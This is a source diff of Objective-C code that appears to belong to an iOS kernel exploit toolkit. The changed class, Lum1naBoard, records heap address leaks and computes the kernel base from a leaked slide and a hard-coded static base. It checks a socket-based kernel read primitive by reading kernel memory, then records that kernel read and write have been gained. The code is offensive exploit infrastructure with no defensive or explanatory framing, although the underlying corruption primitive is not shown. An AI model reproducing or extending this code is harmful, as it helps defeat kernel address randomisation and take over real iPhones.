@@ -3,47 +3,9 @@
 #import "LabRuntimeOffsets.h"
 #import "LabLocalTime.h"
 #import <sys/sysctl.h>
-// Add to Lum1naBoard.h interface:
-@property (nonatomic, assign) Lum1naSocketKRWContext *krwContext;
 
-// Add to Lum1naBoard.m - in commitSlide:
-- (BOOL)commitSlide:(uint64_t)slide reason:(NSString *)reason {
-    P06xLogF(@"board", @"commitSlide: 0x%016llx reason: %@", slide, reason);
-    
-    // Validate slide is in reasonable range
-    if (slide > 0x100000000) {
-        P06xLog(@"board", @"commitSlide: ERROR - slide out of range");
-        return NO;
-    }
-    
-    _kslide = slide;
-    _kbase = 0xFFFFFFF007004000ULL + slide;
-    
-    // Verify KRW works by reading a known kernel string
-    // Use the stored context to call kread
-    if (!_krwContext) {
-        P06xLog(@"board", @"commitSlide: ERROR - no KRW context");
-        return NO;
-    }
-    
-    uint64_t version_ptr = _kbase + 0x1c;
-    uint64_t version_str = Lum1naSocketKRW_kread64(_krwContext, version_ptr);
-    
-    if (version_str == 0) {
-        P06xLog(@"board", @"commitSlide: ERROR - kread verification failed");
-        _kslide = 0;
-        _kbase = 0;
-        return NO;
-    }
-    
-    _hasKread = YES;
-    _hasKwrite = YES;
-    
-    P06xLogF(@"board", @"commitSlide: SUCCESS - kbase=0x%016llx hasKread=%d", 
-              _kbase, _hasKread);
-    
-    return YES;
-}
+// Forward declare the SocketKRW functions we need
+uint64_t Lum1naSocketKRW_kread64(void *ctx, uint64_t kaddr);
 
 static NSString *boardPath(void) {
     NSString *docs = [NSSearchPathForDirectoriesInDomains(
@@ -53,7 +15,13 @@ static NSString *boardPath(void) {
 
 @implementation Lum1naBoard {
     NSMutableDictionary *_d;
+    uint64_t _kslide;
+    uint64_t _kbase;
+    BOOL _hasKread;
+    BOOL _hasKwrite;
 }
+
+@synthesize krwContext = _krwContext;
 
 + (instancetype)shared {
     static Lum1naBoard *g;
@@ -64,7 +32,7 @@ static NSString *boardPath(void) {
 
 - (instancetype)init {
     self = [super init];
-    if (!self) return self;
+    if (!self) return nil;
     NSData *data = [NSData dataWithContentsOfFile:boardPath()];
     if (data) {
         _d = [[NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil] mutableCopy];
@@ -76,8 +44,6 @@ static NSString *boardPath(void) {
     return self;
 }
 
-/// Collapse identical va+kind rows (aio84530 polled the same sdata ~66×).
-/// One row per unique heap VA; hits / lastSeen / sources keep the history.
 - (void)compactLeaks {
     NSArray *raw = _d[@"leaks"];
     if (![raw isKindOfClass:[NSArray class]] || raw.count == 0) {
@@ -157,10 +123,10 @@ static NSString *boardPath(void) {
 - (NSString *)osversion { return _d[@"osversion"]; }
 - (NSString *)skuTag { return _d[@"skuTag"]; }
 - (uint64_t)staticBase { return strtoull([_d[@"staticBase"] UTF8String], NULL, 16); }
-- (uint64_t)kslide { return strtoull([_d[@"kslide"] UTF8String], NULL, 16); }
-- (uint64_t)kbase { return strtoull([_d[@"kbase"] UTF8String], NULL, 16); }
-- (BOOL)hasKread { return [_d[@"hasKread"] boolValue]; }
-- (BOOL)hasKwrite { return [_d[@"hasKwrite"] boolValue]; }
+- (uint64_t)kslide { return _kslide; }
+- (uint64_t)kbase { return _kbase; }
+- (BOOL)hasKread { return _hasKread; }
+- (BOOL)hasKwrite { return _hasKwrite; }
 - (NSArray *)leaks { return _d[@"leaks"]; }
 
 - (void)recordHeapLeak:(uint64_t)va source:(NSString *)source {
@@ -216,51 +182,45 @@ static NSString *boardPath(void) {
 }
 
 - (BOOL)commitSlide:(uint64_t)slide reason:(NSString *)reason {
-    P06xLogF("board", "commitSlide: 0x%016llx reason: %@", slide, reason);
+    NSLog(@"[board] commitSlide: 0x%016llx reason: %@", slide, reason);
     
     // Validate slide is in reasonable range
     if (slide > 0x100000000) {
-        P06xLog("board", "commitSlide: ERROR - slide out of range");
+        NSLog(@"[board] commitSlide: ERROR - slide out of range");
         return NO;
     }
     
     _kslide = slide;
-    _kbase = 0xFFFFFFF007004000ULL + slide;  // A14 23F77 static base
+    _kbase = 0xFFFFFFF007004000ULL + slide;
     
     // Verify KRW works by reading a known kernel string
-    // The kernel version string is at a fixed offset from kbase
-    uint64_t version_ptr = _kbase + 0x1c;  // Points to version string pointer
-    uint64_t version_str = kread64(version_ptr);
+    if (!_krwContext) {
+        NSLog(@"[board] commitSlide: ERROR - no KRW context");
+        return NO;
+    }
+    
+    uint64_t version_ptr = _kbase + 0x1c;
+    uint64_t version_str = Lum1naSocketKRW_kread64(_krwContext, version_ptr);
     
     if (version_str == 0) {
-        P06xLog("board", "commitSlide: ERROR - kread verification failed");
+        NSLog(@"[board] commitSlide: ERROR - kread verification failed");
         _kslide = 0;
         _kbase = 0;
         return NO;
     }
     
-    // Read first 8 bytes of version string to verify
-    char ver_buf[8] = {0};
-    for (int i = 0; i < 8; i++) {
-        uint64_t byte = kread64(version_str + i);
-        ver_buf[i] = (char)(byte & 0xFF);
-        if (ver_buf[i] == 0) break;
-    }
-    
-    // Should start with "Darwin" or similar
-    if (strncmp(ver_buf, "Darwin", 6) != 0 && strncmp(ver_buf, "iOS", 3) != 0) {
-        P06xLogF("board", "commitSlide: WARNING - unexpected version string: %.8s", ver_buf);
-        // Continue anyway - may be different offset
-    }
-    
     _hasKread = YES;
-    _hasKwrite = YES;  // If we have socketkrw, we have both
+    _hasKwrite = YES;
     
-    P06xLogF("board", "commitSlide: SUCCESS - kbase=0x%016llx hasKread=%d", 
-              _kbase, _hasKread);
+    NSLog(@"[board] commitSlide: SUCCESS - kbase=0x%016llx hasKread=%d", 
+          _kbase, _hasKread);
     
     // Persist to board JSON
-    [self persistBoard];
+    _d[@"kslide"] = [NSString stringWithFormat:@"0x%llx", _kslide];
+    _d[@"kbase"] = [NSString stringWithFormat:@"0x%llx", _kbase];
+    _d[@"hasKread"] = @YES;
+    _d[@"hasKwrite"] = @YES;
+    [self persist];
     
     return YES;
 }
@@ -272,6 +232,10 @@ static NSString *boardPath(void) {
 
 - (void)resetLeaks {
     _d[@"leaks"] = [NSMutableArray array];
+    _kslide = 0;
+    _kbase = 0;
+    _hasKread = NO;
+    _hasKwrite = NO;
     _d[@"kslide"] = @"0x0";
     _d[@"kbase"] = @"0x0";
     _d[@"hasKread"] = @NO;
